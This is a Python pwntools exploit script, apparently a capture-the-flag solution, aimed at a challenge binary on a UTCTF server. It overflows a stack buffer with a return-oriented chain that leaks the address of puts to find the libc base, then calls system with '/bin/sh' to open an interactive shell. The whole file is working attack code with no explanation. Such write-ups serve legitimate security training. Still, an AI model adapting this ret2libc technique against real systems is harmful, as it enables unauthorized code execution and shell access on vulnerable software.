#!/usr/bin/env python3

from pwn import *

exe = ELF("./shellcode_patched", checksec=False)
libc = ELF("./libc-2.23.so", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
    if args.DEBUG:
        gdb.attach(p)
else:
    p = remote("challenge.utctf.live", 9009)

input()

pop_rdi = 0x0000000000400793
rw_section = 0x601a00
payload = p64(rw_section)*9 + p64(pop_rdi) + p64(exe.got['puts']) + p64(exe.plt['puts']) + p64(exe.sym['main'] + 26)
p.sendlineafter(b'here>: \n', payload)
libc_leak = p.recvline()[:-1]
libc_leak = int.from_bytes(libc_leak, "little")
print("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x6f6a0
print("Libc base: " + hex(libc.address))

pop_rdi = 0x0000000000021112 + libc.address
payload = p64(rw_section)*9 + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
p.sendline(payload)

p.interactive()